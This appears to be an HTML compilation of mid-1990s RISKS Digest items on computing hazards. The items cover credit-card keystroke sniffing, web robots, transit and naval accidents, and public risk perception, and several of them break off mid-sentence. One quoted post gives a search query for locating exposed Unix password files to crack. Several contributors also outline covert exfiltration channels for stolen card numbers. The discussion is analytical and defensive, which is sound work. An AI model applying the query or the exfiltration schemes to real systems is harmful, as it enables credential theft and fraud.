overstate the RISK.  Just as one runs certain risks in handing a credit
card to a minimum-wage employee, personal computers pose some risks--but
who benefits and who bears the costs are critical to a system analysis.
<P>
The first claim (ease of keyboard sniffing) is certainly true; the
demonstration program shows that nicely.
<P>
The second claim (ease of recognition) is more dubious.  Certainly,
credit-card numbers typed in directly from a keyboard are recognizable,
but is that the only practical way to enter them?  Of course not.  There
are several obvious technical counter-measures for this aspect of the
threat.  For example, one could enter part of the number, back up with
cursor keys, and enter the rest of the number.  Software could request
the number following a simple code (e.g., 0=W, 1=S, 2=Z, generated
randomly for each request; a similar approach is used for verifying
licensees of much PC game software).  Software could display a
calculator key-pad for entering the number with mouse clicks.  And so
on--a little ingenuity goes a long way.
<P>
Although these methods may seem a bit clumsy, they need only be used
once per credit-card number.  That one-time inconvenience would not be
an unreasonable burden for users--and data entry errors (which clearly
are a risk of such special-purpose interfaces) would be minimal due to
precisely the same properties that make credit-card numbers easily
recognizable in the first place.  Such counter-measures undermine the
"fatal flaw" claim, for none of them require an account-based system
like FV's; neither do they involve secure hardware.
<P>
Of course, malicious software could also be created to defeat any of
these approaches, just as it could be created to perform the "extremely
difficult" task of defrauding FV's multi-step transaction approach.
However, any of these counter-measures removes the most important
property of the attack: the ability to recognize credit-card numbers
without context.  Instead, a significantly more complex directed
attack--or, rather, one for each possible application program--is needed
to extract the numbers from a deliberately safeguarded user interface.
<P>
There is a related threat that relies on the recognizability attribute:
finding credit-card numbers stored, say, as ASCII text in memory, on
disk, or in network traffic is no more conceptually difficult than
recognizing keystrokes.  The same sort of context-free recognition is
straightforward.  However, even a light encryption of such data (e.g.,
XOR) will foil the simple context-free attack, and require that a
recognition program understand the semantics of the data it's looking
for.  The analysis here applies to such scenarios as well.
<P>
The third claim (easy and traceless infiltration) is dubious as well.
Truly effective malicious software is DIFFICULT: witness the extremely
primitive payloads of most extant PC viruses.  Although recognizing the
keystrokes may be easy and reliable, neither the process of installation
into arbitrary consumer PCs nor the mechanism for returning the
information is likely to be.  Most people who have ever installed
software on a PC, or who have ever used a PC-based communication
mechanism, will recognize that these activities have considerable
potential to generate errors and anomalous events.  Traceless
infiltration, however, requires that no such events occur.
<P>
Although the great thing about malicious software (from the bad guy's
point of view) is that it only needs to be written once and after that,
any fool can run it, it still has to be written and to work properly.
Capturing credit-card numbers when they are typed as consecutive digits
presents an especially easily recognized pattern, so that part of the
program's job is simple, but that doesn't affect the compatibility and
reliability aspects.  Widespread distribution of a credit-card capture
program would likely result in compatibility problems throughout its
user community--nothing serious, but quite possibly enough to to
discover it in the same manner that other viruses are discovered.  It's
not at all clear that such a program could become widespread without
being quickly discovered--which argues against "tracelessly".
<P>
This hypothetical (as opposed to FV's laboratory demonstration of
partial version of such a program) invisible credit-card capture and
delivery program is very similar to a traditional virus payload, except
that it need not be self-propagating and its function is more complex
(thus, more likely to be detected).  It's probably distributed on-line
for maximum efficiency, but that could be done with ordinary viruses
also.  Viruses are bad, and one could even claim that their existence is
a "fatal flaw" in personal computers... but we go on computing anyway.
<P>
The fourth claim (easy and traceless reporting) also is dubious, for
similar reasons.  Although there are many potential schemes for sending
information back to the perpetrator, these back-channels are likely to
be noticeable, due perhaps to volume, perhaps to the appearance of
unexpected traffic, or perhaps to errors that occur when a particular
back-channel is attempted that doesn't work as expected in some user
environment.  For example, one proposed scheme involves making postings
to "test" newsgroups and encrypting the information in the article's
message ID.  Technically feasible, yes, but what happens when a user
gets an error message about how the PC "Error 07C: Cannot post to
misc.test"?  If this starts happening on a wide scale, the malicious
software (though probably not its author) will soon be discovered.
<P>
Finally, it's important to recognize what it might mean for a
counter-measure to be called successful.  If "successful" means
apprehending the criminal perpetrator who created the malicious
software, well, that's certainly hard.  However, if "successful" means
protecting individual consumer credit-card accounts and minimizing the
cost to the global financial system, that's much easier.  An attack
might be detected by noticing anomalies; prevented (offensively)
through something like virus-removal technology; or prevented
(defensively) through guarded data entry schemes.  Although none of
these mean that the perpetrator can be found, they do mean that the
attack is foiled--and that financial loss is minimized.
<P>
These attacks are certainly technically possible, and worth taking some
general counter-measures against.  It seems unlikely, however, that they
would bankrupt either consumers or financial institutions, or that they
would become widespread before specific counter-measures (along the
lines of anti-virus scanners) were available.
<P>
One general problem is worth noting: if such an attack IS perpetrated,
tracing perpetrators is damned difficult.  However, the propensity of
criminals to talk about their activities, to keep diaries, and to get
caught doing other criminal (and often stupid) things at least offers
some possibilities.  I'm actually more worried about lone attackers than
about a large-scale organized assault by criminal organizations.
Hostile intelligence services (or militaries) are also, to my mind, a
bigger threat.  For individuals, the economic incentive for credit-card
number theft is, to be sure, greater than for simple virus distribution,
but profiting from stolen card numbers is fairly risky and difficult on
a large scale--one really needs a retail outlet for the information.
<P>
Knowing all this, it would clearly be prudent (A) to design and use
safeguarded user interfaces and (B) to bring this threat into the scope
of things that concern developers of virus counter-measures.  But
abandon encrypted credit-card numbers as any part of an Internet
commerce scheme?  That seems like an over-reaction.
<P>
The RISK here is one of assuming that a specific technical vulnerability
translates directly into a system-wide problem of equal severity, and
recourse is inherently impossible.  Over-stating the threat can be just
as dangerous as ignoring it.

I was checking my cellular phone account balance using a cellular phone. They
offered a payment option which I took. Luckily I miskeyed it because as I

also read it back in case the eavesdroppers weren't sophisticated enough to

Denver airport forgot to install an intercom system for the subways that
trundle passengers from concourse to concourse, so when the computer
controlling the subways broke down, there was no way to communicate with the

<P>
The Forrestal missile launching was an unintended launch, but IMHO, it was more
of a training error than a hardware failure.
<P>
At the time of the incident, I was the aircraft maintenance officer on the USS
INDEPENDENCE (CVA-62), the sister ship of the FORRESTAL.  The FORRESTAL had
just arrived in the waters off Viet Nam when the "incident" (which killed in
excess of 100 men--I don't remember exactly how many) occurred.  The FORRESTAL
had just come from an eight-month overhaul period, and her crew was
inexperienced.  Navy ships are required to undergo proficiency inspections,
called INSERVs, after long periods of inactivity.  The INDEPENDENCE had given
FORRESTAL her INSERV, and she had flunked.  This was NOT a reflection on the
crew, but rather on the fact that they needed more training.  The admiral in
charge of the INSERV inspection, however, overrode the recommendation of his
staff and certified the FORRESTAL as ready for action.  The reason given was
that the Navy desperately needed the FORRESTAL on station in the Gulf.
<P>
A flight deck during flight ops is one of the most hazardous places imaginable.
Besides planes taking off or landing, planes and ammunition are being moved
around, refueling and defueling is occurring, maintenance vehicles and
equipment ("yellow gear") is moving, testing, and/or starting aircraft, and
other operations are going on.  This is all in a space only one-tenth the size
of a land-based airfield.  Flight deck personnel need eyes in the back of their
head and a sixth sense of where everything is, and must know their jobs
instinctively.  The FORRESTAL crew was so green that during the inspection, the
INDEPENDENCE's flight deck officer left the flight deck and refused to return,
considering it too dangerous.
<P>
I don't recall the details of the actual incident, save that it involved a
plane that had been improperly loaded and armed released a missile at an F-4
that was ready for takeoff on catapult #1 (on the port side forward).  Since
fuel and ammunition had been improperly placed on the deck, this quickly
touched off explosions and fires that ran the length of the deck.  I do clearly
recall that the reason for the accidental launch was not due to equipment
failure: it was caused by aircrew error in both attaching and arming the
missiles.  (Consider the problem of designing a system that must NOT work until
it's ready, and then must not FAIL to work.)
<P>
The risk, in other words, was improper training in a complex and hazardous
environment.  I would hope that the Navy (and other organizations) would take a
lesson from this.

<P>
During the early hours of the "Blizzard of '96" in the Washington
metropolitan area, a Metro train operator was killed when his train
ran into the back of a parked train at the Shady Grove Metro
station. Shady Grove is one of the endpoints of the system, and is
located in Gaithersburg, Maryland, a northern suburb of Washington.
<P>
The train was being taken out of service for the night, and had
moved past the station platform and into a railyard at the terminus.
Press reports at the time indicated the train rolled past the
station at normal track speed, and struck a parked train. The
operator, who sits in a very small (&lt; 2m square) compartment at the
very front of the train, was pinned in the car and died of his
injuries.
<P>
There were early conflicting reports about the cause of the
accident. Several sources reported hearing radio calls from the
train to the track supervisor, asking for permission to take the
train off automatic control and manually move into the yard. There
was disagreement over whether permission had been granted, and one
source suggested the operator had failed to pay attention to his
speed after taking manual control.  More recent reports suggest that
permission was refused, and the train was under automatic control at
the time of the collision.
<P>
While the investigation is ongoing, Metro announced today that changes in
operational procedures were being made immediately in light of what had
already been learned.  The change announced today is that operators will
have discretion at all times to take trains out of automatic mode.
<P>
A local radio station reports that the operator asked for permission
to take the train under manual control, that permission was refused,
and the train proceeded through the station at fairly high speed,
applied the brakes normally, but failed to stop on the icy rails.
<P>
Some of the risks are obvious: The automatic system is unable to determine
if traction on the rails is poor, and so does not adequately adjust a
train's speed.  The trains are routinely operated in automatic mode in
crowded rail yards, which builds confidence in the system under ideal (dry)
conditions.  Supervisors must approve taking a train out of manual mode, and
those supervisors may not be fully aware of track conditions.
<P>
Particularly tragic in this case is that a manual system was available, and
the train operator wanted to use that system, but was prevented by the rules
from doing so.  Today's change at least reduces that risk.

&gt;From Communications of the ACM, February 1996, Newstrack:
<P>
"Heart of the matter...  The first film-less heart imaging system that
stores its pictures of the human heart on CD-ROM disks has been built at the
North Shore University Hospital in Manhasset, L.I., in collaboration with
General Electric. The disks store full-motion pictures of cardiac
catheterization tests, or angiograms, and within a year North Shore doctors
hope to be transmitting medical records electronically between hospitals in
its growing network, as well as to outside specialists.  North Shore
officials say the computerized records will save the hospital $12,000 a year
on film, processing chemicals, and labor and storage in outside warehouses.
"The advantage is in instantaneous retrieval of the images at a level of
clarity that is better than a filmed angiogram," says the hospital's chief
of cardiology."
<P>
One potential risk with this type of system would be the "configuration
management" challenge - what image goes with what patient?  As any sotware
developer knows, keeping track of a lot of different files on disk, many of
which have more than one version, is not a trivial task.  While many
solutions to this problem exist in the form of version control systems for
source code and document management systems for large amounts of
documentation, electronic medical records and images may introduce some new
dimensions to this challenge, especially in a distributed environment. A
system like the one described above must have the necessary facilities to
help insure that the right images are associated with, and retrieved for,
the right patient.  In cases where the wrong image is retrieved, whether for
diagnosis or to guide a procedure, the risks are, as they say, obvious.
These types of problems can and do occur with the current "manual"
procedures.  The shift to electronic record keeping approaches must be
accompanied by changes to the procedures used to prevent these kinds of
situations, and will require a lot of electronic "support".

<P>
Here are three risks of "web robots" I've run across recently that
I think Risks readers might find interesting.
<OL>
<LI>The first is probably already well known to Risks readers: password
files accidentally being exported to the world. Web servers are just yet
another way of making that mistake.
<P>
Here is a post that has already had wide circulation (and may have
already appeared in Risks... I'm unable to scan back issues to check right now
because of heavy network load):
<P>
&gt;Subject: BoS: Misconfigured Web Servers<BR>
&gt;<BR>
&gt;     A friend of mine showed me a nasty little "trick" over the weekend. He<BR>
&gt;     went to a Web Search server (<A HREF="http://www.altavista.digital.com/">http://www.altavista.digital.com/</A>) and<BR>
&gt;     did a search on the following keywords -<BR>
&gt;<BR>
&gt;             root: 0:0 sync: bin: daemon:<BR>
&gt;<BR>
&gt;     You get the idea. He copied out several encrypted root passwords from<BR>
&gt;     passwd files, launched CrackerJack and a 1/2 MB word file and had a<BR>
&gt;     root password in under 30 minutes. All without accessing the site's<BR>
&gt;     server, just the index on a web search server!<BR>
&gt;<BR>
....
&gt;<BR>
&gt;     The guy that showed me this found it funny, but I find it disturbing.<BR>
&gt;     Are there that many sites that are that poorly configured?<BR>
&gt;<BR>
&gt;     <A HREF="mailto:Mark_W_Loveless@smtp.bnr.com">Mark_W_Loveless@smtp.bnr.com</A>
<P>
I just verified that indeed this search does work, although to my
relief the majority of the "hits" found are legitimate documents discussing
UNIX security. The risks are fairly obvious.
<P><OL>
<LI>Here is a variation on the above risk that I HAVEN'T seen discussed
before, however. See what happens if you search AltaVista for THESE keywords:
<P>
"unpublished proprietary source code actual intended reserved copyright notice"
<P>
The results of this search are even more frightening, at least to me.
<P>
The general risk is not just that you can conveniently find password
files, but ANY kind of document that shouldn't be widely distributed:
material useful for breaking into your system, copyrighted material, illegal
material, libelous material, incriminating or embarrassing material, etc...
<P></LI></OL>
<LI>The second risk works the other way: fooling stupid web robots so<BR>
as to lure people to your web site.
<P>
A month ago I tried searching for "eisner reciprocity paradox" on
WebCrawler, hoping to find that it had indexed a paper of mine that I had
reprinted electronically under my home page. Nope, it hadn't (or at least
I was unable to find it using any of the likely keywords I could think of!).
Instead the single match was on a URL intriguingly entitled
"The information source".
<P>
Gee, this "information source" must have an article in it about
Eisner's Reciprocity Paradox, one that I hadn't known of before! So I followed
the link, and ended up at something unexpected: "<A HREF="http://www.graviton.com/red/">http://www.graviton.com/red/</A>",
"The Red Herring Home Page"! (It comes complete with gifs of red fish!)
<P>
A little experimentation revealed that almost ANY obscure search would
match "The information source", often as the only matching document found.
As near as I could figure out, his site recognized probes by web robots and
then threw a dictionary at them! (His point made, he has since stopped,
although the Red Herring page is still there for your perusal.)
<P>
I contacted the author, Tom White, and asked for more details. He
didn't want to give his secrets away, but did reply:
<P>
&gt; I will say that I spent no more than an hour on the whole thing, including<BR>
&gt; writing the page, and it was effective far beyond what I thought a silly<BR>
&gt; trick like that would muster.  I think that by virtue of not hiding what<BR>
&gt; I am trying to do, people who write web indexers may see the page and think<BR>
&gt; of ways to subvert feeble attempts like mine - which is a good thing since<BR>
&gt; the page could have as easily been any propaganda I wanted to push on people.
<P>
The risk? It can be frustratingly difficult (or impossible) to get a
web robot's attention for a legitimate page you WANT indexed, or to find a
page you know is there amist all the distractions of "false hits". Part of
the clutter may be wildly off-topic pages engineered to fool web robots into
thinking that almost anything matches them. (Or simply long rambling pages
containing lots of poems and such... documents that "fool" the robots more
by accident than design.)
<P></LI>
<LI>Finally, the act of being searched can cause problems for certain kinds<BR>
of sites: ones that carry hundreds of thousands of distinct URLs, often
generated only on demand, and that don't expect any one site to ever have
reason to download ALL of them, whether all at once or a few at a time.
<P>
See for example "<A HREF="http://xxx.lanl.gov/RobotsBeware.html">http://xxx.lanl.gov/RobotsBeware.html</A>". The authors
state there: "This www server has been under all-too-frequent attack from
`intelligent agents' (a.k.a. `robots') that mindlessly download every link
encountered, ultimately trying to access the entire database through the
listings links. In most cases, these processes are run by well-intentioned but
thoughtless neophytes, ignorant of common sense guidelines."
<P>
They have been forced to take a "proactive" stance to protect
themselves: "We are not willing to play sitting duck to this nonsensical
method of `indexing' information." The rather UNIQUE hot link that follows,
"(Click here to initiate automated `seek-and-destroy' against your site.)",
doesn't actually do anything but pause for 30 seconds, I'm told...
<P>
I'll let readers examine the page and draw their own Risks!

The US National Transportation Safety Board has released a report stating
that the Air Traffic Control system is "very safe", although they do
recommend more training in the use of backup features and making the
features easier to use.  This is according to an article in Aviation Week,
1/29/96.  They characterised the backup modes as "inefficient".
<P>
RISKs contributors (and, presumably, readers) seem to jump on every incident
involving aircraft as identifying a new RISK, and I guess I resent the
implicit accusation that those of us in aviation (I work part-time as a
pilot and flight instructor, although my "real" occupation is mathematics
professor) have not identified any of these RISKS.  In fact, the entire
corpus of aviation regulatory and training materials exists to address and
reduce RISK.  I won't claim that we have thought of everything, but very
little has escaped our notice.  If a new RISK is uncovered, regulations and
procedures change quickly (alas, sometimes regulations change for no good
reason, but that is the RISK of a bureaucracy at work).

WASHINGTON (Reuter) - The Air Force Wednesday projected a
dazzling array of new U.S. arms and space sensors for the 21st
century, from pilotless hypersonic attack jets to microwaves
that cripple enemy electronics.
The possible high-tech weapons listed in a year-long study
released by the service are so advanced that special training
would be essential to make sure humans are not overwhelmed by
science. ``The keyboard and the mouse are simply not adequate
for the 21st Century,'' said Gene McCall of Los Alamos National
Laboratory, chief of the Air Force Scientific Advisory Board.
Air Force Secretary Sheila Widnall and McCall presented the
2,000-page study, telling a Pentagon press conference these and
other systems could be built in 10 to 50 years:
<UL>
<LI>Warplanes that fly at speeds as high as 7,000 miles an
hour without pilots, guided by brain waves and using lasers or
microwaves to attack the enemy.
<LI>Low-flying families of satellites that help aircraft and
missile-launchers send their weapons to targets
instantly and assure delivery of relief supplies accurately in
any kind of weather at any time.<BR>
<LI><STRONG>Stables of disruptive ``information warfare'' weapons
that confuse and disable enemy electronics and communications
systems such as commercial computers.</STRONG>
<LI>Satellite-based global positioning systems that tell
aircraft and ground troops where they and their targets are
located within a half-inch).
</UL>
``Let me assure you that this study is not going to sit on
the shelf and gather dust. We have already set aside funding for
some of these promising new areas of research,'' Widnall said.
McCall said some space and communications systems could be
ready within a decade but hypersonic aircraft and missiles that
could maneuver sharply would be a major challenge. He also said
machines must not outpace human ability to use them.
``What we have to make sure of is that people are the
primary actors at the major points,'' he said, showing a video
of a blinking pilot, concentrating to use brain waves to control
maneuvers in a flight simulator.<BR>
McCall said the Air Force could advance ``stealth''
technology, allowing an aircraft to better avoid ground radar by
making the underbelly completely smooth and putting the wheels
on top -- landing the plane in a flip maneuver.<BR>
``The pilots don't like that,'' he smiled.
Laser-guided bombs used to defeat Iraq in the 1991 Gulf War
were only the beginning, the report suggested. But it stressed
that speed was the hallmark of the future.
Aircraft and satellite sensors, cooperating in the future,
will tell U.S. forces within one second when an anti-aircraft
missile site anywhere in the world is activated, sending a
hypersonic missile to attack the site from 200 miles away within
a minute.<BR>
The board also suggested that high-tech research will
produce non-lethal or ``sub-lethal'' microwaves that attack the
enemy's information systems. ``You could produce impulses that,
if you are attacked by an airplane, you could simply turn off
all the warning lights in that airplane and send it home. Or,
force the pilot to bail out,'' McCall told reporters.

DCCA-6 Call for Papers
********************************************************************
Sixth IFIP International Working Conference on
Dependable Computing for Critical Applications
<P>
Can We Rely on Computers?
<P>
March 5-7, 1997
Garmisch-Partenkirchen, Germany
********************************************************************
<P>
Organized by
IFIP Working Group 10.4 on Dependable Computing and Fault Tolerance
In cooperation with
IFIP Technical Committee 11 on Security and Protection in Information
Processing Systems
IEEE Computer Society Technical Committee on Fault-Tolerant Computing
EWICS Technical Committee 7 on Systems Reliability, Safety and Security
<P>
Computer systems are used to perform many critical tasks, including guiding
aircraft, scheduling railroads, assisting in surgery, controlling nuclear
reactors, performing financial transactions, military command and control,
and a host of other applications. Properties that such a system must have can
include availability, reliability, safety, and security. Although the study
of these properties evolved as separate disciplines, they have in common the
fact that a user must have a high degree of confidence in the service that the
system delivers. The notion of dependability captures these concerns within
a single conceptual framework, making it possible to approach the different
requirements of a critical system in a unified way.
<P>
The sixth IFIP Working Conference on Dependable Computing for Critical
Applications aims at bringing together researchers and developers from
academia, industry, and government who are advancing the state-of-the-art
in dependable computing. Papers are sought in all areas of dependable
computing, including but not limited to models, methods, algorithms, tools
and practical experience with specifying, designing, implementing, assessing,
validating, operating, and maintaining dependable computing systems. Papers
that deal with man-machine interface issues (as they relate to dependability)
are specifically encouraged. Of particular but not exclusive interest will be
presentations that address combinations of dependability attributes, e.g.,
safety and security, through studies of either a theoretical or an
applied nature.
<P>
Garmisch-Partenkirchen lies at the foot of Germany's highest mountain, the
Zugspitze. The Olympic town is a winter sports capital and favored destination
for excursions and trips in Upper Bavaria.
<P>

<I>Mon, 12 Feb 1996 17:20:42 +1100</I>
<P>
This e-mail is a summary of, and quotes heavily from, an article entitled
"Outrage at the unknown" that appeared in the *Sydney Morning Herald* on 8
February 1996. The article was written by Simon Chapman, the associate
professor of Public Health and Community Medicine at the University of
Sydney, Australia. Chapman himself quotes Peter Sandman of Rutger's
University.
<P>
Recently (late 1995 I think) Telstra (the public telecommunications company
of Australia) tried to install a new mobile-phone tower adjacent to a
kindergarten in Harbord (a suburb of Sydney). A group of residents, with
their young children carrying placards, chained themselves to Telstra's
fence, and called in the media complaining about (among other things) the
danger of electro-magnetic radiation (EMR).
<P>
Within two weeks, Telstra had lost face and switched off the installation. A
fortnight later the same battle erupted in another suburb, and it's happened
again in Harbord after the antennas were moved to a different site.
<P>
This continuing row is proving a feast for people in public health who study
the public's reaction to health risks. These "risks analysts" address questions
of how people might be motivated about a serious risk and calmed down about
risks that are trivial.
<P>
To a scientist, risk is the magnitude of the danger multiplied by the
probability of exposure. When the furor over the towers erupted, Telstra
called in the Australian Radiation Laboratory. Their EMR meters barely got
the needle off zero. It would be hard to find a serious scientist who would
call the towers a risk.
<P>
So why did the towers cause such outrage? Because this way of measuring risk
is not how ordinary (i.e., non-technical people) think. Chapman lists
Sandman's seven characteristics that determine an issue's "outrage valency"
in a community.
<P>
Voluntary vs coerced risks: if something is voluntary it will be much more
acceptable, eg. skiing while dangerous, is voluntary, and is not widely
dreaded.  A major theme of the Harbord protest is that Telstra (the "big
company") rode roughshod over the Harbord residents (the "little people").
<P>
Natural vs industrial risks: there are countless examples of communities
being upset by chemicals that have been "put there" by government/industry,
while not showing the slightest concern for the natural supply of these
chemicals.  For example, anti-fluoridationists are often shocked to find
that some areas contain naturally high levels of fluorine in the water.
Certainly, Telstra's towers are quintessentially industrial.
<P>
Familiar vs exotic risks: mobile phones are new and exotic and hence attract
outrage. The longstanding electricity substation, located at ground level
opposite the kindergarten, which emits comparatively huge amounts of EMR, is
familiar and attracts no outrage.
<P>
Not dreaded vs dreaded: diseases like cancer, AIDS, plague, tuberculosis
create a great deal more public concern than others, eg. heart disease. The
Telstra towers "might" cause cancer in children.
<P>
Chronic vs catastrophic: Thousands are killed on roads (as part of driving
accidents) but rarely in large groups. Plane accidents are much rarer,
cause fewer deaths, but because they can cause large fatalities, air travel
is much more widely feared than car travel. [Perhaps this explains (in part)
the number of articles regarding air safety in comp.risks ;-) ] Telstra's
towers "might" cut swathes into the future health of the local children.
<P>
Knowable vs not-knowable: much to the dismay of Telstra, the fact that the
Australian Radiation Laboratory could barely detect any EMR from the towers,
actually seemed to increase outrage (not decrease it).
<P>
Morally irrelevant vs morally relevant: communities tend to have
zero-tolerance for outrage-inducing problems. Telstra tried to favourably
compare the amount of EMR in TV sets, microwaves, sunlight and a fluorescent
lamp, but to no avail.
<P>
Well, that ends the summary, what follows are my thoughts.
<P>
The Telstra towers meet all of Sandman's characteristics. It would be no
surprise to him I suspect of the outrage they induced in the community.
<P>
The RISKS [sorry you had to wait so long for it :-( ] for those of us in the
scientific/industrial community is that we fail to understand how the
community measures risk. As Sandman says: "Experts focus on hazard and ignore
outrage. ... The public focuses on outrage and ignores hazard."
<P>
Understanding how the community measures risk should enable us to develop
more acceptable products or at least make their introduction easier. While
it is useful to have the public vet all products (to avoid the introduction
of "nasties"), technology has the potential to benefit everyone, and
unnecessary delay or fear, reduces that benefit.
<P>
So when we see cases like the Telstra towers we should not dismiss the
reaction as the fears of an ill-informed and untrained public, but rather
see it as the normal response of a community that measures risks according
to different criteria.
<P>
Hence, if Telstra could have found a better way of measuring the risk of
their towers (i.e., the Radiation Laboratory and their EMR meters), they may
have avoided publicity like the angry Harbord father, jabbing his fingers on
TV, at dour Telstra officials, and shouting: "There's no way I am going to
let my daughter or any of my kids go to that place and be exposed to that
sort of risk!"

Reading about LANL's "(Click here to initiate automated `seek-and-destroy'
against your site.)", I was reminding about a story that happened to a
friend of mine a few weeks ago.
<P>
Turns out that my friend was writing a web-walking robot, and it made the
mistake of walking into the LANL site. This robot was running at the end of
a 28.8K SLIP link, so it wasn't capable of issuing more than 1 request every
2-3 seconds.
<P>
Well, the folks at LANL have some sort of monitoring software, because they
noticed it immediately. What they did was they called up his Internet
service provider and said that he was attacking a federal interest computer,
and they threatened the ISP that unless they revealed the name and phone
number of my friend, LANL would take legal action against the ISP.
<P>
Those fun-loving guys at LANL then called up my friend and left the
following message on my friend's answering:
<P>
"YOU ARE RUNNING A WEB ROBOT THAT IS ATTACKING A FEDERAL INTEREST SITE.
UNLESS YOU TURN IT OFF WITHIN AN HOUR, WE WILL SUE YOU AND SHUT YOUR
COMPANY DOWN."
<P>
The folks at LANL then called my friend's Internet service provider and
threatened them with legal prosecution for violation of various computer
crime statutes, unless the ISP cut off my friend's Internet connection.
<P>
This is really scary --- the thought that some government official can call
up your ISP and, through a combination of threats and legal citations, have
somebody's Internet feed immediately terminated. What about due process of
law? What about innocent until proven guilty? What about having to go
through the mere formality of obtaining a court injunction before having
action such as this taken?

A few weeks ago our WWW server was brought to its knees. We were being
inundated with thousands of URL requests for a student's home page. The page
didn't look that interesting, but we closed out the account and put out an
all-points search for the student in question and tried to figure out what
the entire world wanted from this student.  Theories varied from a viral
attack to wayward robots.
<P>
When he was dragged into the computer services center, he confessed to what
he had done: He had installed one of these nifty counters to see how many
times his pages was read. Since he had no hits other than himself, he
decided to include some good names on his page (a little racier than "sex 'n
drugs 'n rock 'n roll", but this is a family publication) and then he
registered his page with "some cyberporn list".  He did not remember which
one it was. So apparently all the robots in the world found a new site that
seemed to have racy new stuff in it; It was duly registered and there appear
to be quite a number of people that either automate the search for sex
pictures or check out what's new first thing in the morning; many are so
stupid and keep trying, even when the server tells them that this link is no
longer in operation.  It took days for things to calm down. Needless to say,
the student currently has his net account revoked...
<P>
The moral of the story: don't attract robots with false claims, there
are too many of them out there!

In response to messages sent to, but not included in RISKS, Bob Dolan (Xerox
Corp.) observes that countermeasures are a continuing battle:
<P>
From: <A HREF="mailto:Robert_Dolan.wbst129UL@xerox.com">Robert_Dolan.wbst129UL@xerox.com</A><BR>

Subject: RISKS (and lack thereof) of typing credit-card numbers
<P>
It appears to me that no matter what methods are employed to detect
these types of intruder programs, new approaches will always develop.
It is consistent with the cracker mentality.
<P>
Fortunately, the pace of development in malicious software seems to be
fairly slow.  Once an initial strain is reasonably well neutralized,
later more virulent versions don't seem to propagate as fast.
<P>
Bob Dolan also identifies a fraud prevention problem:
<P>
The flaw in this system lies in the fact that anyone can use a credit
card to order merchandise and have it shipped to any address.  If the
credit-card number implied a shipping address that matched the
billing address, the numbers would lose their value to the crackers
who steal them.  I realize this does not work for all users.
However, anyone who desires secure transactions, would certainly want
to use this type of credit card.
<P>
Actually, the credit-card companies do make fair use of delivery address
in guarding against fraud; some reader here no doubt has had a friendly
call from American Express asking whether they really meant to order 24
leather coats for delivery to downtown L.A.  However, with digital
goods, this is a more serious problem, as there's no physical "delivery
address" that can be meaningfully validated.  As with existing fraud
detection schemes, there will always be a battle of wits going on, and
some cost of fraud to be absorbed in the costs of doing business.
Delivery address validation for electronically ordered physical goods
is something the credit-card companies have well in hand today.
<P>
Charlie Abzug questions the feasibility of untraceable delivery:

Reply-to: <A HREF="mailto:CharlesAbzug@ACM.org">CharlesAbzug@ACM.org</A>
Subject: Capturing keystrokes of credit-card numbers
<P>
I would like to add in my two-cents' worth:  The claim that the
credit-card numbers would be sent out "sub rosa" and thereafter would
be untraceable does not bear up to close examination.  Once the
Trojan Horse software is discovered on someone's computer, it can be
decompiled or disassembled to yield the full information on the
E-mail address or other scheme by which the information is sent out
of the compromised host computer to some unsuspected destination.
<P>
The problem is not in determining how the data is delivered, but who the
recipient might be.  True, you can find out what the mechanism is by
analysis and disassembly, but that doesn't tell you who actually gets the
messages.  Delivery to an anonymous recipient isn't hard--one need merely
take advantage of the Internet's broadcast media, such as mailing lists and
newsgroups.  Cryptographic encoding of the 60-odd bits that make up a credit
card number into, say, a Message-ID field in mail or a news posting would be
sufficient.  It doesn't even have to be a particular newsgroup: the
perpetrator can simply watch all newsgroups for a value with the right
format, much as Mr. Kibo watches for his name in postings everywhere.
Knowing that the delivery is taking place, it can be stopped, but it's still
going to be very hard to trace it to some perpetrator.  However, the
perpetrator still has to have a way to USE the credit-card numbers thus
obtained, and that's the point at which traditional fraud detection and
law-enforcement measures become relevant.

CARD NUMBER INTO AN INSECURE COMPUTER".  Because computer security is hard
to understand for those who feel good just being sure which icons are the
minimize and maximize boxes (i.e. most computer users), he dropped the
"INSECURE" from his message.  Unfortunately, most computers now in use
(which means PCs) run operating systems that are insecure (MacOS, DOS,
Win3.1, Win95).  Although Windows NT is presently vulnerable to this attack,
a simple additional API call that retrieves a string from the user that is
not visible to other programs or hooks would prevent the attack.  NT does
this kind of operation now for logins.
<P>
<LI>Although most virus software is primitive ("Sturgeon's Law: 90% of<BR>
everything is junk"), there is no reason for this situation to continue when
such an immense financial gain can be made.  How many of us _really_ know
all what software we are running at any given moment?  Win3.1, DOS, and I
believe Win95 do not normally come with a program that can list all running
programs -- and I suspect the same is true of MacOS.
<P>
<LI>Communicating the credit-card data to another system could be done via<BR>
Windows Sockets TCP/IP API calls, which (if there is already an active
connection) could be done entirely silently in the face of all errors.
Since "netstat"-like utilities can list all active TCP/IP connections,
determining whether or not there is already at least one connection ready to
be piggybacked is a solvable problem.  Even with the inevitable
compatibility problems, a lot of credit cards could be stolen in just a
week's time.
<P>
<LI>Widespread distribution could likely be achieved by suitable social<BR>
engineering -- adding the Trojan Horse to one of the interminable series of

that most people who actually package software don't go through the kind of
background checks I did to get my security clearance...

<P>
U.S. Senator Patrick Leahy - why.html
<P>
I am turning my World Wide Web page black for 48 hours as part of the
protest by my fellow Internet users against the online censorship
provisions of the new telecommunications law. The online censorship
provisions should be repealed, and I plan to introduce legislation to do
just that.
<P>
I was one of five Senators who voted against this legislation, in large
part because of what I believe are unconstitutional restrictions on what
we can say online. I hope you will take the time to read my full
statement on the telecommunications law contained on my web-page. While I
do not condone the transmission of obscene material or child pornography
on the Net, I believe the solution proposed in the telecommunications law
will do more to harm the use and growth of the Net without combatting the
problem for which it is intended.

A bit of background first.  There is a disorder called `high functioning
autism'.  These people are usually quite intelligent, (one is even an
Associate Professor) but have have trouble with social and emotional
relationships.  They tend to interpret events and personal reactions poorly
and very literally.  They can be very sensitive about this deficiency.
<P>
While monitoring an Autism list an interesting event occurred.  There was an
ongoing argument (not a flame war) between one member (self-confessed high
functioning autistic) and the rest of the group.  Suddenly she sent a
message to the group that he/she was unsubscribing.  Apparently there had
been some strong personal e-mail to this person including *several messages
in a foreign language*.  This person was *quite* upset that someone was
apparently sending `flames' in a foreign language.
<P>
After several days the list finally figured out what was happening.  There
was a subscriber in Brazil who had not check his/her mailbox and it was
full.  It turns out that the Brazilian majordomo was sending return messages
to the effect that this mailbox was full.  (I don't understand why this
person, and only a few others, got the messages and not the sending
listserver so don't ask.)
<P>
This person is/was very sensitive to e-mail messages.  In this case messages
in a foreign language cause a significant amount of emotional distress.
There are a significant number of electronic emotional support groups.  By
